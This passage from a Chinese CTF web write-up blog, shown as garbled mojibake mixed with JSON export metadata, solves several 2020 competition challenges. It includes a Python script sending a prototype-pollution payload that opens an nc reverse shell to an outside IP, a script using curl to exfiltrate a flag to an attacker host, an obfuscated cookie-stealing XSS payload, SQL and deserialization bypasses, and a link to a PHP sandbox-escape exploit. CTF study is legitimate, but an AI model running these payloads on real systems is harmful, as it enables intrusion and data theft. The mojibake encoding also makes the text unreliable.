current_folder_file = os.listdir(self.path) except: current_folder_file = current_folder_file def __str__(self): if 'fl4g' in self.path: return 'nonono,this folder is a secret!!!' else: output = '''Welcome,dear vip! Here are what you want:\\r\\nThe file you read is:\\r\\n''' filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) output += filepath output += '\\r\\n\\r\\nThe content is:\\r\\n' try: f = open(filepath,'r') content = f.read() f.close() except: content = 'can\\'t read' output += content output += '\\r\\n\\r\\nOther files under the same folder:\\r\\n' output += ' '.join(current_folder_file) return output éœ€è¦ç»•è¿‡é»‘åå• 12if &#39;fl4g&#39; in self.path: return &#39;nonono,this folder is a secret!!!&#39; æˆ‘ä»¬ä¼ å…¥çš„æ˜¯readfile 12345678def GetName(self): return self.filedef GetFileName(self): return self.file.GetName()self.filename = readfile.GetFileName()self.path = os.path.dirname(os.path.abspath(self.filename))filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) åˆ†æä¸‹æ±ªæ±ªæ±ªå¸ˆå‚…çš„payload http://127.0.0.1:8080/read/file=/{vipfile.file[0]}l4g_1s_h3re_u_wi11_rua/flag æœ¬åœ°æ­å»ºä¸‹ 123filepath &#x3D; (&#39;C:\\\\&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;&#123;vipfile&#125;&#39;).format(vipfile&#x3D;self.file)&#x3D;&gt;filepath &#x3D; (&#39;C:\\\\fl4g_1s_h3re_u_wi11_rua&#39; + &#39;&#x2F;flag&#39;) format()æ˜¯å¯ä»¥ä¼ å…¥å¯¹è±¡çš„ï¼Œè¿™é‡Œä¼ å…¥çš„self.fileæ˜¯fileå¯¹è±¡ï¼Œfile.fileæ˜¯{str}&#39;flag&#39;ï¼Œå› æ­¤vipfile.file[0]å°±æ˜¯fï¼Œè‡³äº{vipfile}ï¼Œå°±æ˜¯def __str__(self):è¿”å›çš„å­—ç¬¦ä¸² æœ€åä¸¾ä¸ªç®€å•çš„ä¾‹å­ ==================åˆ†å‰²çº¿ è¡¥å……ä¸‹å‰é¢sstiçš„æ¢æµ‹è¿‡ç¨‹ï¼Œå½“æ—¶ä¸çŸ¥é“ä¸ºå•¥æ²¡æµ‹å‡ºæ¥ 1&#123;file.__class__&#125; 1&#123;file.__class__.__init__.__globals__&#125; å‘ç°fileä¸‹æœ‰ä¸ªvip 1&#123;file.vip.class.init.globals&#125; nwebæ ¹æ®htmlæç¤º110ï¼Œä¿®æ”¹typeï¼ŒæˆåŠŸæ³¨å†Œ ä¹‹åæ˜¯sqlæ³¨å…¥ï¼ŒæŠ¥500ï¼ŒçŒœæµ‹æ˜¯æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ï¼Œå¾—åˆ°ä¸€åŠflag æç¤ºRogue-MySql-Serverï¼Œç»™äº†è´¦å·å¯†ç ï¼Œç™»å½•adminå‘ç°å¯ä»¥mysqlæ¶æ„æœåŠ¡ç«¯è¯»å– UAF-PHPPHP7.4ï¼Œä½†æ˜¯æœªå¼€å¯FFI 1apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system 1open_basedir &#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp ç”¨è¿™ä¸ªphp7.0-7.4çš„exp https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg æ²™ç®±æœ‰ç‚¹é—®é¢˜ï¼Œæœ€åæ”¾tmpç›®å½•ä¸‹å†åŒ…å«æ‰æˆåŠŸ webctä¸Šä¼ phar.gifï¼Œåˆ©ç”¨mysqlæœåŠ¡ç«¯æ¶æ„è¯»å–æ–‡ä»¶è§¦å‘phar:// è®°å½•ä¸€ä¸ªå°å‘ï¼ŒPHPçš„é…ç½®ä¸€èˆ¬æ˜¯å¸¸é‡ï¼Œå› æ­¤å¯ä»¥æ‰“å°ä¸‹ä»è€Œè§£å†³ç›´æ¥ä¼ MYSQLI_OPT_LOCAL_INFILEä¼ è¾“åå˜å­—ç¬¦ä¸²çš„é—®é¢˜ 12345678&lt;?php $m = new mysqli('117.78.1.xxx','root','root'); if($m-&gt;connect_error)&#123; die($m-&gt;connect_error); &#125; var_dump(MYSQLI_OPT_LOCAL_INFILE); $m-&gt;options(MYSQLI_OPT_LOCAL_INFILE,1); $result=$m-&gt;query('select 1;'); optionä¼ 8å³å¯ easy_trick_gzmtuæ¯ä¸ªå­—æ¯å‰æ·»åŠ \\å³å¯ï¼ŒæˆåŠŸå¾—åˆ° urlï¼š /eGlhb2xldW5n usernameï¼š admin passwordï¼š 20200202goodluck ç™»å½•åå­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œç»•è¿‡æœ¬åœ° 1url&#x3D;file:&#x2F;&#x2F;localhost&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php index.php 123456789&lt;?phpinclude('conn.php');error_reporting(0);$time = date($_GET['time']);$sql = \"select * from `content` where `createtime` = '$time' \";$r = $conn-&gt;query($sql);$content = $r-&gt;fetch_array(MYSQL_ASSOC);?&gt; https://www.php.net/manual/zh/function.date.php åœ¨æ ¼å¼å­—ä¸²ä¸­çš„å­—ç¬¦å‰åŠ ä¸Šåæ–œçº¿æ¥è½¬ä¹‰å¯ä»¥é¿å…å®ƒè¢«æŒ‰ç…§ä¸Šè¡¨è§£é‡Šã€‚ eGlhb2xldW5n/check.php 123456789101112131415161718&lt;?phpinclude(\"../conn.php\");if(empty($_SESSION['login']))&#123; die('è¯·ç™»å½•!');&#125;if(isset($_GET['url']))&#123;$url = $_GET['url'];$parts = parse_url($url);if(empty($parts['host']) || $parts['host'] != 'localhost') &#123; die('è¯·ä»æœ¬åœ°è®¿é—®');&#125; if(!preg_match(\"/flag|fl|la|ag|fla|lag|log/is\", $parts['path']))&#123; readfile($url); &#125;else&#123; die('ä¸è¦æè¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ã€‚'); &#125;&#125; è¿™é‡Œæ˜¯$parts = parse_url($url); https://www.php.net/manual/zh/function.parse-url.php /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass trick&#123; public $gf; public function content_to_file($content)&#123; $passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)) &#123; if(strpos($passwd,\"20200202\"))&#123; echo file_get_contents(\"/\".$content); &#125; &#125; &#125; public function aiisc_to_chr($number)&#123; if(strlen($number)&gt;2)&#123; $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) &#123; $str = $str .chr($num); &#125; return strtolower($str); &#125; return chr($number); &#125; public function calc()&#123; $gf=$this-&gt;gf; if(!preg_match('/[a-zA-z0-9]|\\&amp;|\\^|#|\\$|%/', $gf))&#123; eval('$content='.$gf.';'); $content = $this-&gt;aiisc_to_chr($content); return $content; &#125; &#125; public function __destruct()&#123; $this-&gt;content_to_file($this-&gt;calc()); &#125; &#125;unserialize((base64_decode($_GET['code'])));?&gt; ç»•è¿‡æ­£åˆ™ç”¨%0aï¼Œä¸¤ä½çš„é™åˆ¶ï¼Œå®ƒæœ€åæœ‰ä¸ªtolowercase()ï¼Œå¯ä»¥ç”¨å¤§å†™ç»•è¿‡ï¼Œ å­—æ¯çš„è¿‡æ»¤ï¼Œåˆ©ç”¨å–åæ“ä½œ 12345a = 'FLAG'res = ''for i in a: res += str(ord(i))print(res) 123456789101112&lt;?phpclass trick&#123; public $gf;&#125;$s = \"70766571\";$s = urlencode(~$s);$a = new trick();$a-&gt;gf = urldecode('~'.$s);echo base64_encode(serialize($a));//å¦ä¸€ç§å†™æ³•//$a = new trick();//$a-&gt;gf = '~'.(~'70766571'); 1Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM&#x2F;IycnKyM4iO30&#x3D; urlç¼–ç ä¸‹å³å¯ =================================åˆ†å‰²çº¿ ä¸Šé¢æ˜¯åšè¿‡çš„ =================================åˆ†å‰²çº¿ hackme session.serialize_handlerè¯¯ç”¨å¯¼è‡´çš„ååºåˆ—åŒ–é—®é¢˜ï¼š https://www.cnblogs.com/sijidou/p/10455646.html ç»•è¿‡ä»£ç ä¸­ç»™å‡ºçš„é™åˆ¶å‚è€ƒbytectfåŸé¢˜ï¼šå››å­—ç¬¦å†™shellå†™shellåcat /flag 1compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;baidu.com?,ls GuessGame1234567if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123; //res.end(flag); //Stop your wishful thinking and go away!&#125;if(req.query.q === flag) result+=flag;res.end(result); åŸå‹é“¾æ±¡æŸ“ 1&#123;\"user\":&#123;\"username\":\"admÄ±n888\",\"__proto__\": &#123;\"enableReg\": True&#125;&#125;&#125;) 50è¡Œä½¿ç”¨regExpæ¥åŒ¹é…flagï¼ŒregExpå¯æ§ï¼Œå› æ­¤å¯ä»¥æ„é€ ç‰¹æ®Šè¡¨è¾¾å¼æ§åˆ¶åŒ¹é…æ—¶é—´ å‡è®¾flagä¸ºï¼šflag{klasdfjasfasdfadffsdfas} æ„é€ var reg = /^flag{(((([a-zA-Z0-9]+)+)+)+)+1$/ åŒ¹é…çš„æ—¶é—´ä¼šç›¸å½“é•¿ å†æ„é€ var reg = /^flag{a(((([a-zA-Z0-9]+)+)+)+)+1$/åŒ¹é…æ—¶é—´ä¼šå¾ˆçŸ­ï¼ˆåŒ¹é…åˆ°k!=aä¼šç›´æ¥ç»“æŸï¼‰å› æ­¤å¯ä»¥é€šè¿‡åŒ¹é…æ—¶é—´æ¥åˆ¤æ–­flagï¼Œä½†æ˜¯è¿˜æ²¡å¤ªæƒ³å¥½ ç§˜ç¬ˆï¼æ‰‹å·¥ç›²æ³¨ï¼ ====================åˆ†å‰²çº¿ emmè‡ªå·±æœ¬åœ°æ­äº†ä¸ª 12345678910111213141516171819var express = require('express');var app = express();var flag = \"flag&#123;klasdfjasfasdfadffsdfas&#125;\";app.get('/', function (req, res) &#123; let regExp = req.query.q; console.log(regExp); console.log(flag); if(flag.match(regExp))&#123; &#125; res.send('ok');&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(\"åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s\", host, port)&#125;) ä¸‹é¢çš„payloadæµ‹è¯•æˆåŠŸ 1^(?&#x3D;xx)(.*)*aaaaa$ &#x2F;&#x2F;xxxåŒ¹é…ä¸Šä¼šå»¶æ—¶ï¼Œå¹¶ä¸”ç»“å°¾ä¸èƒ½æ˜¯aaaaa =================åˆ†å‰²çº¿ çœ‹äº†vnçš„wpï¼Œç›´æ¥rceï¼Œå½“æ—¶ä¹Ÿæœ‰ç‚¹ç–‘é—®ï¼Œè¢«æ±¡æŸ“çš„å‚æ•°æ˜æ˜ä¼šè§¦å‘ï¼Œä¸ºå•¥ä¸èƒ½rceã€‚ã€‚ã€‚ v&amp;nçš„è„šæœ¬ 123456789101112import requeststheips = [\"http://121.37.179.47:8081/\",\"http://121.37.167.12:80\",\"http://121.37.167.12:81\",\"http://121.37.167.12:82\"]proxies=&#123;\"http\":\"http://localhost:4476\"&#125;while 1: for i in theips: try: requests.post(i,json=&#123;\"user\":&#123;\"username\":\"admIn888\",\"__proto__\":&#123;\"enableReg\":True,\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 106.14.15.50 1234 &gt; /tmp/fa ');var __tmp2\"&#125;&#125;&#125;,timeout=1,proxies=proxies) requests.get(i,timeout=1,proxies=proxies) except: pass NothardWebcbcå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œå¯¹äºå·²çŸ¥æ˜æ–‡å’Œå¯†æ–‡ï¼Œå³å¯æ„é€ æˆ‘ä»¬éœ€è¦çš„æ˜æ–‡å¯¹åº”çš„å¯†æ–‡ åˆ†ææ˜æ–‡å’Œå¯†æ–‡ï¼Œå› ä¸ºæ˜¯æ˜æ–‡æœ€åéœ€è¦ååºåˆ—åŒ–ï¼Œå› æ­¤cbcå­—èŠ‚ç¿»è½¬æ”»å‡»éœ€è¦ivï¼Œæ€è·¯æ˜¯åˆ©ç”¨cbcé€‰æ‹©å¯†æ–‡æ”»å‡»å¾—åˆ°ivï¼Œä½†æ˜¯å¥½åƒåˆä¸è¡Œï¼Œä¼¼ä¹éœ€è¦æ§åˆ¶ä»»æ„æ˜æ–‡æ‰è¡Œ ================åˆ†å‰²çº¿ å› ä¸ºkeyç”Ÿæˆçš„æ–¹å¼strval(mt_rand() &amp; 0x5f5e0ff)ï¼Œ 0x5f5e0ff = 0b101111101011110000011111111ï¼Œ19ä¸ª1æœ‰54wå¤šç§æƒ…å†µï¼Œå¸¦å…¥è§£ç å¦‚æœæ­£ç¡®è§£ç è¯´æ˜keyæ˜¯æ­£ç¡®çš„ de1taçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php$cccc=\"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d\";for ($a=0; $a &lt; 2; $a++) &#123; for ($b=0; $b &lt; 2; $b++) &#123; for ($c=0; $c &lt; 2; $c++) &#123; for ($d=0; $d &lt; 2; $d++) &#123; for ($e=0; $e &lt; 2; $e++) &#123; for ($f=0; $f &lt; 2; $f++) &#123; for ($g=0; $g &lt; 2; $g++) &#123; for ($h=0; $h &lt; 2; $h++) &#123; for ($i=0; $i &lt; 2; $i++) &#123; for ($j=0; $j &lt; 2; $j++) &#123; for ($k=0; $k &lt; 2; $k++) &#123; for ($l=0; $l &lt; 2; $l++) &#123; for ($m=0; $m &lt; 2; $m++) &#123; for ($n=0; $n &lt; 2; $n++) &#123; for ($o=0; $o &lt; 2; $o++) &#123; for ($p=0; $p &lt; 2; $p++) &#123; for ($q=0; $q &lt; 2; $q++) &#123; for ($r=0; $r &lt; 2; $r++) &#123; for ($s=0; $s &lt; 2; $s++) &#123; $f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s); $key=base_convert($f_key,2,10); $result=decode_aes($key); if(stripos($result,\"guest\"))&#123; echo $result; echo $key.\"\\n\"; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;function decode_aes($key)&#123; $ch=base64_decode(\"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg==\"); $de = openssl_decrypt($ch,\"des-cbc\",$key,0,\"abcdabcd\"); return $de;&#125;?&gt; éå†å¾—åˆ°çš„keyå¼‚æˆ–è¿˜åŸå‡ºivï¼Œç„¶åå†å’Œhashæ¯”è¾ƒï¼Œæ‰¾å‡ºæ­£ç¡®çš„iv 12345678&lt;?php$key = strval(94675148);//æ¯æ¬¡ä¼šå˜$p = openssl_decrypt($cipher, 'des-cbc', $key, 0, $iv);print_r($p.\"&lt;br/&gt;\");$iv = \"\";for ($i = 0; $i &lt; 8; $i++) &#123;Â·//è¿˜åŸivå°±æ˜¯å’Œå¯†æ–‡å’Œç¬¬ä¸€ç»„æ˜æ–‡è¿›è¡Œå¼‚æˆ– $iv .= chr(ord($p[$i]) ^ ord($plain[$i]));&#125; éé¢„æœŸï¼šä½†æ˜¯å› ä¸ºè¿™é‡Œçš„ivå’Œkeyæ˜¯ä¿å­˜åœ¨sessionä¸­ï¼Œshanaå¸ˆå‚…ç›´æ¥åˆ é™¤sessionidï¼Œé‚£ä¹ˆå°±éƒ½ä¸ºç©ºäº† 1$sessionUser &#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;)); ä¹‹åæ˜¯ä¸ªtomcatçš„PUTæ–¹æ³•ä¼ shellçš„æ¼æ´ï¼Œä¼ ä¸ªewä»£ç† =========================åˆ†å‰²çº¿ vpçš„wpè¿˜æœ‰å¦ä¸€ç§æ€è·¯ æµè§ˆé¢˜ç›®ï¼Œåˆæ­¥åˆ†ææ­¤å¤„ä¸º mt_rand ç‰¹æ€§ï¼Œç¬¬ä¸€æ¬¡è®¿é—®æ—¶å¯ä»¥æ‹¿åˆ° ç¬¬ä¸€æ¬¡ï¼Œç¬¬ 227ï¼Œ228 æ¬¡ç”Ÿæˆçš„éšæœºæ•°ï¼Œçˆ†ç ´éšæœºæ•°ç§å­ä¹‹åå¯ä»¥å¾—åˆ° ç¬¬ 229 ä¸ªéšæœºæ•°ï¼Œå¾—åˆ°å¯†é’¥ã€‚ dooogcmdæœ‰å¾ˆæ˜æ˜¾çš„é€»è¾‘æ¼æ´ï¼Œå¯ä»¥ç»•è¿‡å¯¹cmdçš„åˆ¤æ–­ 1234if int(time.time()) - data[&#39;timestamp&#39;] &lt; 60: if cmd not in [&#39;whoami&#39;, &#39;ls&#39;]: return &#39;cmd error&#39;... ç®€å•åˆ†æä¸‹æºç  åœ¨/getTGTä¸­ï¼Œç”¨(username + &#39;|&#39; + session_key + &#39;|&#39; + str(int(time.time())))ç”ŸæˆTGTçš„KEYæˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯çŸ¥é“åŠ å¯†ç»“æœTGTï¼Œç”¨session_keyç”Ÿæˆsession_key_encçš„KEYæˆ‘ä»¬æ˜¯æˆ‘ä»¬å¯æ§çš„master_keyï¼Œ åœ¨/getTicketä¸­ï¼Œ 123cryptor &#x3D; AESCipher(app.config.get(&#39;SECRET_KEY&#39;))auth_data &#x3D; cryptor.decrypt(base64.b64decode(TGT)).split(&#39;|&#39;)cryptor &#x3D; AESCipher(auth_data[1]) å‘ç°ç”Ÿæˆauthenticatorçš„KEYå°±æ˜¯session_keyï¼Œä¹‹åsession_key2ç”Ÿæˆclient_messageçš„KEYä¹Ÿæ˜¯session_keyï¼Œç”Ÿæˆserver_messageçš„KEYæ˜¯master_key æœ€åï¼Œ 1234client_message, server_message &#x3D; res.content.split(&#39;|&#39;)session_key &#x3D; cryptor.decrypt(base64.b64decode(client_message))cryptor &#x3D; AESCipher(session_key)authenticator &#x3D; base64.b64encode(cryptor.encrypt(username)) å¯¹authenticatorè¿›è¡ŒåŠ å¯†çš„KEYæ˜¯session_key2ã€‚ ç„¶åå°±å¯ä»¥å†™è„šæœ¬äº†ã€‚æŠ„ä¸€ä¸‹ä½œä¸š 12345678910111213141516171819202122232425from toolkit import AESCipherimport osimport requestsimport jsonimport timeimport base64import requestscryptor = AESCipher('00000000')authenticator = cryptor.encrypt(json.dumps(&#123;'username':'Q7','timestamp':int(time.time())&#125;))au = base64.b64encode(authenticator)print autgt = requests.post('http://121.37.164.32:5001/getTGT',data=&#123;'username':'Q7','authenticator': au&#125;).contentprint tgtsession_key, tgt = cryptor.decrypt(base64.b64decode(tgt.split('|')[0])), tgt.split('|')[1]cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(json.dumps(&#123;'username': 'Q7','timestamp': int(time.time())-100&#125;)))res = requests.post('http://121.37.164.32:5001/getTicket', data=&#123;'username': 'Q7', 'authenticator': authenticator, 'TGT':tgt, 'cmd': '''curl q71998.cn:2333 -d `/readflag` '''&#125;).contentprint resclient_message, server_message = res.split('|')session_key = cryptor.decrypt(base64.b64decode(client_message))cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(\"Q7\"))res = requests.post('http://121.37.164.32:5002/cmd',data=&#123;'server_message': server_message, 'authenticator':authenticator&#125;).contentprint res baby_javaxxeè¯»å–hint.txt ä¾èµ–ï§©æœ‰fastjsonï¼Œç‰ˆæœ¬ä¸º1.2.48ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰ˆæœ¬çš„ååºåˆ—åŒ–æ¼æ´ è€Œprefixæ˜¯æƒ³è€ƒfastjsonä¼šè‡ªåŠ¨å¤„ï§¤ - å’Œ_ çš„ç‰¹æ€§ï¼Œåœ¨fastjsonä¸­ï¼Œ parseField è¿™ä¸ªå‡½æ•°ï§©ä¼šå»æ‰å­—ç¬¦ä¸²ä¸­çš„ - å’Œå¼€å¤´çš„ä¸‹åˆ’çº¿ï¼Œå› æ­¤å¸¦ä¸ª - å°±å¯ä»¥ï¦º happyvacationè¿˜æ²¡çœ‹é¢˜å°±è¢«é˜Ÿå‹ç§’äº†ğŸ¤¦â€â™‚ï¸ï¼Œ æœ‰ä¸ªéé¢„æœŸï¼Œåˆ©ç”¨ä¸‹é¢çš„å°†ä¸Šä¼ é»‘åå•ç½®ä¸ºfalseï¼Œä»è€Œä¸Šä¼ ä»»æ„åç¼€æ–‡ä»¶ 1eval(&quot;\\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;); æ§åˆ¶headerå¤´ï¼Œè®¾ç½®ä¸ºgbkï¼Œå¯ä»¥åˆ©ç”¨å®½å­—èŠ‚ä½¿å•å¼•å·é€ƒé€¸ã€‚ä»è€Œxsshttp://159.138.4.209:1002/quiz.php?referer=Content-Type: text/html; charset=GBK; Referer: index&amp;answer=user-&gt;url-&gt;pre payload: 1&#96;1%aa&#39;;var d&#x3D;String.fromCharCode(100,111,99,117,109,101,110,116);var c &#x3D;String.fromCharCode(99,111,111,107,105,101);var w&#x3D;String.fromCharCode(119,105,110,100,111,119);var o&#x3D;String.fromCharCode(111,112,101,110);var ip &#x3D; String.fromCharCode(47,47,52,55,46,50,52,48,46,52,56,46,52,50,58,50,51,51,51,47);self[w].open(ip%2bself[d][c]);&#x2F;&#x2F;&#96; hardphpç¬¬ä¸€æ­¥å»æ··æ·†ã€‚ easywebç”¨ä¸‹é¢çš„åŒ…èƒ½è¯»å–æ–‡ä»¶ï¼Œwpæ²¡è§£é‡Šã€‚ã€‚ã€‚ 1234567891011121314151617POST &#x2F;createmd?operate&#x3D;file&amp;isConvert&#x3D;true HTTP&#x2F;1.1Host: 121.36.222.22:801User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3Accept-Encoding: gzip, deflateContent-Type: text&#x2F;plainReferer: http:&#x2F;&#x2F;121.36.222.22:801&#x2F;profile.jspContent-Length: 39Cookie: JSESSIONID&#x3D;A33FFBFC70E5BF80F9D1E212F7C6402C;session_id&#x3D;7b0e89e7d9943a4581d96c705d3084537b12fceeX-Forwarded-For: 127.0.0.1Connection: close![](http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;profile.jsp) start.sh å†çœ‹åˆ° /home/tomcat/webapps/ROOT/WEB-INF/libs/ ä¸‹ Common Collections ä¸º 3.1ï¼Œæœ‰æ¼æ´ã€‚ å†æ ¹æ®é¢˜ç›®æç¤ºçš„ç«¯å£ 2078, ç„¶åå°±å¯ä»¥åœ¨æœ¬åœ°æ„é€ ä¸€ä¸ª RMI å®¢æˆ·ç«¯ï¼Œè°ƒç”¨ä¸Šé¢è¿™ä¸ªæ–¹æ³•ï¼Œå®æ–½ååºåˆ—åŒ–ã€‚ æ€»ç»“ï¼šåšé¢˜è¿˜æ˜¯å¾—æƒ³æƒ³è€ƒç‚¹æ˜¯å•¥ï¼Œä¸è¦ä¸€å‘³æ­»ç£•ã€‚ çŸ­æ¿è¿˜æ˜¯è¾£ä¹ˆå¤šã€‚ nepnepçš„å¸ˆå‚…ä»¬tqlğŸ‘… å‚è€ƒé“¾æ¥ï¼š https://wx.zsxq.com/dweb2/index/group/824215518412 https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484827&amp;idx=1&amp;sn=08a52b82dd04c37c17c08bcc85dc42de&amp;chksm=fd7110d6ca0699c02196923e2e95f77fbe5048dd023eba473fc391d7f97afde9f0bb7a6cdd93&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1583814055793&amp;sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/?nsukey=IRbrIReu2wgWelMKXIRg4GOxeF%2BLe8ryMZZza8bY%2B5UgrdvTaFVYAQQuqITVkIY%2F3qZZr53BXziZp0BnYjDfHN9KclyHbOpnuX%2F58pz3L1BhHsLZFkkkuhPAe67XBCpceGlpKo05X3R29J7qpnPi7I0QG7Vfn%2Fyrs2SCrbWEs%2F7mJImS4VdDc%2BLdt4vxOsgUV81pEMEh0mC5qAkz7Y92uA%3D%3D&amp;scene=2&amp;clicktime=1583836967&amp;enterid=1583836967&amp;from=timeline&amp;isappinstalled=0 https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"V&N2020å…¬å¼€èµ›wp","slug":"V-N2020å…¬å¼€èµ›wp","date":"2020-03-02T14:06:02.000Z","updated":"2020-03-02T07:41:49.764Z","comments":true,"path":"2020/03/02/V-N2020å…¬å¼€èµ›wp/","link":"","permalink":"https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/","excerpt":"å‰ä¸¤å¤©æ²¡æ‰“ï¼Œè¡¥ä¸€è¡¥ğŸ¤¦â€â™‚ï¸","text":"å‰ä¸¤å¤©æ²¡æ‰“ï¼Œè¡¥ä¸€è¡¥ğŸ¤¦â€â™‚ï¸ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Happy-CTFd CHECKIN TimeTravel EasySpringMVC å‚è€ƒé“¾æ¥ï¼š Happy-CTFdCTFdå‰äº›å¤©å‡ºçš„æ¼æ´ï¼Œæ³¨å†Œç”¨æˆ·æ—¶åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨çš„æ—¶å€™æ²¡æœ‰å¯¹ä¸¤ç«¯ç©ºæ ¼è¿›è¡Œå¤„ç†ï¼Œè€Œæ’å…¥æ•°æ®åº“çš„æ—¶å€™å»é™¤äº†ä¸¤ç«¯çš„ç©ºæ ¼ã€‚å¼€ä¸ªéšç§çª—å£ä¸ºæ–°å¸æˆ·å¯åŠ¨å¯†ç é‡ç½®ï¼Œç”Ÿæˆçš„tokené“¾æ¥ä¸­å¯¹åº”äº†adminè´¦æˆ·ï¼Œæˆ‘ä»¬å…ˆä¿®æ”¹ç”¨æˆ·åä¸ºå…¶ä»–ï¼Œå†å»é‚®ç®±é‡ç½®adminå¸æˆ·çš„å¯†ç ã€‚ CHECKIN123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp &#x3D; Flask(__name__)flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;)# flag &#x3D; flag_file.read()# flag_file.close()## @app.route(&#39;&#x2F;flag&#39;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#39;&#x2F;shell&#39;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd &#x3D; request.args.get(&#39;c&#39;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#39;&#x2F;&#39;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;) emmmï¼Œå…¶å®å°±è€ƒäº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆä¸Šæ–‡æ˜¯åˆ©ç”¨ rm -f flag.txtï¼‰åˆ é™¤ä¹‹åï¼Œåœ¨ /proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„ fdï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚ ç±»ä¼¼çš„è¿˜æœ‰/proc/xxx/ä¸‹çš„cwdæ˜¯è½¯é“¾æ¥ï¼Œselfè¡¨ç¤ºæœ¬è¿›ç¨‹ã€‚å½“æˆ‘ä»¬é€šè¿‡è®¿é—®Apacheè¿è¡Œçš„ç½‘ç«™æ—¶ï¼Œ/proc/self/cwd/å°±ç›¸å½“äºapacheçš„æ ¹ç›®å½• å¦‚æœæœ‰å›æ˜¾ï¼Œç›´æ¥cat /proc/*/fd/*å³å¯ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦åå¼¹shellï¼Œè¿™é‡Œæä¾›3ä¸­åå¼¹æ–¹å¼ 1echo 